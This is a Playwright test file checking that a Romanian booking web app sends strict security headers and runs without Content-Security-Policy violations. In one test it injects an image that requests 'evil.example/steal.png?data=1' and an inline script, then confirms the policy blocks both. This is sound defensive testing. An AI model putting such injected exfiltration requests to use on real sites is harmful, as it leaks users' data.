import { expect, test, type Page } from '@playwright/test';
import { BACKEND, SEED, SEED_PASSWORD, signIn } from './support';

// Security headers (after T35): every page comes with them (vite preview sends the same file as
// Netlify, dist/_headers), and the app works under them: no request or script the
// Content-Security-Policy refuses, on the public pages and on the client's and the shop's screens.

test.beforeEach(async ({ context }) => {
  await context.addInitScript(() => {
    if (!sessionStorage.getItem('sh_test_init')) {
      sessionStorage.setItem('sh_test_init', '1');
      localStorage.setItem('sh_lang', 'ro');
    }
    const seen: string[] = [];
    (window as Window & { __csp?: string[] }).__csp = seen;
    document.addEventListener('securitypolicyviolation', (e) => seen.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
});

async function violations(page: Page): Promise<string[]> {
  return page.evaluate(() => (window as Window & { __csp?: string[] }).__csp ?? []);
}

test('every page comes with the security headers', async ({ request }) => {
  for (const path of ['/', '/intra', '/c/cauta', '/manifest.webmanifest']) {
    const res = await request.get(path);
    const h = res.headers();
    expect(h['content-security-policy'], path).toContain("frame-ancestors 'none'");
    expect(h['content-security-policy'], path).toContain("object-src 'none'");
    expect(h['strict-transport-security'], path).toBe('max-age=31536000; includeSubDomains');
    expect(h['x-frame-options'], path).toBe('DENY');
    expect(h['x-content-type-options'], path).toBe('nosniff');
    expect(h['referrer-policy'], path).toBe('strict-origin-when-cross-origin');
    expect(h['permissions-policy'], path).toContain('camera=()');
  }
});

test('the public pages run under them: the start-up guard too', async ({ page }) => {
  for (const path of ['/', '/intra', '/cont-nou?rol=service', '/verifica', '/legal/termeni']) {
    await page.goto(path);
    await expect(page.locator('#root')).not.toBeEmpty();
    expect(await violations(page), path).toEqual([]);
  }
  // The inline start-up guard is allowed by its hash (it would report a violation otherwise).
  expect(await page.evaluate(() => (window as Window & { __shStarted?: boolean }).__shStarted)).toBe(true);

  // And what is not on the list is refused: a script slipped into the page cannot send data out
  // or load more code.
  await page.evaluate(() => {
    const img = document.createElement('img');
    img.src = 'https://evil.example/steal.png?data=1';
    document.body.appendChild(img);
    const script = document.createElement('script');
    script.textContent = 'window.__injected = true';
    document.body.appendChild(script);
  });
  await expect.poll(() => violations(page)).toEqual(expect.arrayContaining([expect.stringMatching(/^img-src https:\/\/evil\.example/), expect.stringMatching(/^script-src/)]));
  expect(await page.evaluate(() => (window as Window & { __injected?: boolean }).__injected)).toBeUndefined();
});

test.describe('signed in', () => {
  test.skip(!BACKEND, 'needs the local Supabase stack');
  test.setTimeout(90_000);

  test('the client: search, the map, a shop page with photos, Cont', async ({ page }) => {
    await signIn(page, SEED.client, SEED_PASSWORD);
    await expect(page).toHaveURL(/\/c\/cauta/);
    await page.goto('/c/cauta?vedere=harta');
    await expect(page.locator('.leaflet-tile-loaded').first()).toBeAttached({ timeout: 15_000 }).catch(() => undefined);
    await page.goto('/c/cauta');
    await page.locator('article a').first().click();
    await expect(page.getByRole('heading', { level: 1 })).toBeVisible();
    await page.goto('/c/cont');
    await expect(page.getByRole('heading', { level: 1, name: 'Cont' })).toBeVisible();
    expect(await violations(page)).toEqual([]);
  });

  test('the shop: panou, programări, setări', async ({ page }) => {
    await signIn(page, SEED.shop, SEED_PASSWORD);
    await expect(page).toHaveURL(/\/s\/panou/);
    for (const path of ['/s/programari', '/s/cont/setari/reguli', '/s/cont/setari/profil']) {
      await page.goto(path);
      await expect(page.getByRole('heading', { level: 1 })).toBeVisible();
      expect(await violations(page), path).toEqual([]);
    }
  });
});
